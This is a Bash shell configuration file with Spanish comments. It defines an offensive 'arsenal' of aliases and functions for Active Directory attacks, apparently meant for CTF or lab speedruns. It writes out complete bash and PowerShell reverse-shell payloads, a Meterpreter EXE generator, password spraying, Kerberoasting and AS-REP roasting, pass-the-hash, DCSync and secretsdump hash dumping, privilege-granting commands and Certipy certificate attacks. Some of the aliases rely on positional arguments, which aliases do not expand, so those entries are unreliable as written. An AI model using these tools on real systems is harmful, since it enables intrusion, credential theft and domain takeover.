#!/bin/bash
#
#  _   _  ______ ______  _   _   __  __ 
# | \ | ||  ____||  ____|| \ | | |  \/  |
# |  \| || |__   | |__   |  \| | | \  / |
# | . ` ||  __|  |  __|  | . ` | | |\/| |
# | |\  || |____ | |____ | |\  | | |  | |
# |_| \_||______||______||_| \_| |_|  |_|
#
# ARSENAL DE NEENAH v1 - SPEEDRUN EDITION AD  
#

# ===================================================================
# 1. UTILIDADES GENERALES
# ===================================================================

# Servidor web rápido. Uso: serve <puerto>
serve() { local port="${1:-8000}"; echo -e "[\e[92m+\e[0m] Sirviendo en http://0.0.0.0:$port ..."; python3 -m http.server "$port"; }

# Listener de Netcat. Uso: listen <puerto>
listen() { local port="${1:-443}"; echo -e "[\e[92m+\e[0m] Escuchando en puerto $port..."; sudo nc -lvnp "$port"; }

# Copia la IP de tun0 al portapapeles. Uso: tunip
tunip() { local ip=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}'); if [ -n "$ip" ]; then echo -n "$ip" | xclip -sel clip; echo -e "[\e[92m+\e[0m] IP de tun0 [\e[96m$ip\e[0m] copiada."; else echo "[-] Interfaz tun0 no encontrada." >&2; fi; }

# ===================================================================
# 2. RECONOCIMIENTO
# ===================================================================

# Escáner Nmap enfocado en AD. Uso: scan-ad <IP_DC> [args]
scan-ad() { if [ -z "$1" ]; then echo "[i] Uso: scan-ad <IP_DC>"; return 1; fi; mkdir -p "$1/nmap"; echo "[+] Escaneando AD en $1..."; sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -T4 -oN "$1/nmap/ad_scan.nmap" "$1" "${@:2}"; }


# ===================================================================
# 3. PAYLOADS Y SHELLS
# ===================================================================

# Generador de Reverse Shells. Uso: revshell <tipo> <ip> <puerto>
revshell() { local t=$1; local i=$2; local p=$3; local pl=""; case $t in bash) pl="bash -i >& /dev/tcp/$i/$p 0>&1";; powershell) pl="powershell -nop -c \\\"\$client=New-Object System.Net.Sockets.TCPClient('$i',$p);\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\\\"";; *) echo "[-] Tipos: bash, powershell"; return 1;; esac; echo "$pl" | xclip -sel clip; echo -e "[\e[92m+\e[0m] Reverse shell de [\e[96m$t\e[0m] copiada."; }

# Generador rápido de EXE de Meterpreter. Uso: gen-exe <ip> <puerto> <nombre.exe>
gen-exe() { msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f exe -o $3; echo "[+] Payload $3 creado."; }


# ===================================================================
# 4. ACTIVE DIRECTORY: ENUMERACIÓN Y ATAQUES INICIALES
# ===================================================================

# Kerbrute: enumerar usuarios. Uso: kb-users <IP_DC> <dominio> <lista_usuarios>
kb-users() { kerbrute userenum --dc "$1" -d "$2" "$3"; }

# Kerbrute: spray de contraseñas. Uso: kb-spray <IP_DC> <dominio> <lista_usuarios> <pass|lista_pass>
kb-spray() { kerbrute passwordspray --dc "$1" -d "$2" "$3" "$4"; }

# Impacket: AS-REP Roasting. Uso: asrep <IP_DC> <dominio.local>
alias asrep='impacket-GetNPUsers.py -dc-ip $1 -request -format hashcat -outputfile asrep_hashes.txt $2/'

# Impacket: Kerberoasting. Uso: keroast <IP_DC> <dominio/usuario:contraseña>
alias keroast='impacket-GetUserSPNs.py -dc-ip $1 -request -format hashcat -outputfile kerberoast_hashes.txt $2'

# NetExec: Enumeración general. Uso: nxc-enum <IP> <user> '<pass>' <dominio>
nxc-enum() { nxc smb "$1" -u "$2" -p "$3" -d "$4" --users --groups --shares; }

# BloodyAD: Dumpear todo el dominio. Uso: b-dump <dominio> <usuario> '<contraseña>'
b-dump() { bloodyad -d "$1" -u "$2" -p "$3" get all; }

# BloodyAD: Añadir un usuario. Uso: b-adduser <dominio> <usuario> '<contraseña>' <nuevo_usuario> <nueva_contraseña>
b-adduser() { bloodyad -d "$1" -u "$2" -p "$3" add user "$4" "$5"; }

# ===================================================================
# 5. ACTIVE DIRECTORY: MOVIMIENTO LATERAL Y ACCESO
# ===================================================================

# Shell interactiva con Evil-WinRM. Uso: ewinrm <IP> <usuario> '<contraseña>'
alias ewinrm='evil-winrm -i $1 -u $2 -p "$3"'

# Evil-WinRM con Pass-the-Hash. Uso: ewinrm-pth <IP> <usuario> <hash_NTLM>
alias ewinrm-pth='evil-winrm -i $1 -u $2 -H "$3"'

# Pass-the-Hash con wmiexec.py. Uso: pth-wmi <hash_NTLM> <dominio/usuario@IP>
alias pth-wmi='impacket-wmiexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:$1" "$2"'

# ===================================================================
# 6. ACTIVE DIRECTORY: DOMINIO Y PERSISTENCIA
# ===================================================================

# SecretsDump: Dumpear hashes SAM/LSA/NTDS. Uso: secdump <dominio/usuario:contraseña@IP>
alias secdump='impacket-secretsdump.py'

# DCSync: Dumpear hashes usando el privilegio DCSync. Uso: dcsync <dominio/usuario:contraseña>
alias dcsync='impacket-secretsdump.py -just-dc'

# BloodyAD: Dar privilegio DCSync a un usuario. Uso: b-give-dcsync <dominio> <user_admin> '<pass>' <usuario_objetivo>
b-give-dcsync() { bloodyad -d "$1" -u "$2" -p "$3" set-right "$4" DCSync; }

# BloodyAD: Dar GenericAll sobre un objeto. Uso: b-give-genericall <dominio> <user_admin> '<pass>' <usuario_objetivo>
b-give-genericall() { bloodyad -d "$1" -u "$2" -p "$3" set-right "$4" GenericAll; }


# ===================================================================
# 7. BLOODHOUND Y AD CS (CERTIFICATE SERVICES)
# ===================================================================

# Iniciar/Parar servicios de BloodHound. Uso: bh <start|stop>
bh() { case $1 in start) sudo neo4j console & sleep 10 && bloodhound --no-sandbox;; stop) sudo neo4j stop;; *) echo "[i] Uso: bh <start|stop>";; esac; }

# Colector de BloodHound. Uso: bh-collect <usuario> '<contraseña>' <IP_DC> <dominio.local>
bh-collect() { bloodhound-python -u "$1" -p "$2" -ns "$3" -d "$4" -c all; }

# Certipy: Encontrar plantillas vulnerables. Uso: cp-find <dominio>/<usuario>:<contraseña> -dc-ip <IP_DC>
alias cp-find='certipy-ad find -vulnerable -stdout'

# Certipy: Solicitar certificado (ESC1). Uso: cp-req <dominio>/<usuario>:<contraseña> -dc-ip <IP_DC> -ca <nombre_ca> -template <plantilla>
alias cp-req='certipy-ad req'

# Certipy: Autenticarse con certificado (PtC). Uso: cp-auth <certificado.pfx>
alias cp-auth='certipy-ad auth -pfx'

# Certipy: Ataque Shadow Credentials. Uso: cp-shadow <pfx_file> <usuario_a_comprometer>
cp-shadow() { certipy-ad shadow -pfx "$1" -u "$2" -action add; }


echo -e "\n[\e[92m+\e[0m] Arsenal de Neenah v7.0 (Speedrun Edition) cargado. Dominación total."